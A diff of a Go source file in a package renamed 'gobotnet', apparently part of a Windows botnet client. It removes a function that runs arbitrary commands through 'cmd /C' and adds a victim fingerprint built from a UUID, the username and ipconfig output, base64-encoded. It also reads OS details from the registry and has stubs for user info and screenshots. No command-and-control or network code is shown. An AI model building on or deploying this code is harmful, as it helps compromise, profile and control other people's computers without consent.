@@ -1,28 +1,32 @@
-package prgCmd
+package gobotnet
 
 import (
+	"encoding/base64"
 	"fmt"
+	"github.com/satori/go.uuid"
 	"golang.org/x/sys/windows/registry"
-	"os/exec"
 	"os/user"
 )
 
 func CmdTest() {
 	fmt.Println("test prgCmd")
-	fmt.Println(getName())
-	fmt.Println(getOS())
-	fmt.Println(getUid())
-	fmt.Println(getUsername())
-	fmt.Println(getHomeDir())
-}
+	// fmt.Println(getName())
+	//fmt.Println(getOS())
+	// fmt.Println(getUid())
+	// fmt.Println(getUsername())
+	// fmt.Println(getHomeDir())
 
-func CmdExec(cmd string) ([]byte, error) {
-	return exec.Command("cmd", "/C", cmd).Output()
+	fmt.Println(base64.StdEncoding.EncodeToString([]byte(getIdentificator())))
 }
 
 func getUsername() string {
 	usr, _ := user.Current()
 	return usr.Username
+}
+
+func getIdentificator() string {
+	ipConfigOut, _ := CmdExec("ipconfig")
+	return uuid.NewV4().String() + getUsername() + string(ipConfigOut)
 }
 
 func getUid() string {
@@ -45,7 +49,7 @@ func getScreenshot() {
 }
 
 func getOS() string {
-	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion`, registry.READ)
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, registry.READ)
 	if err != nil {
 		return ""
 	}
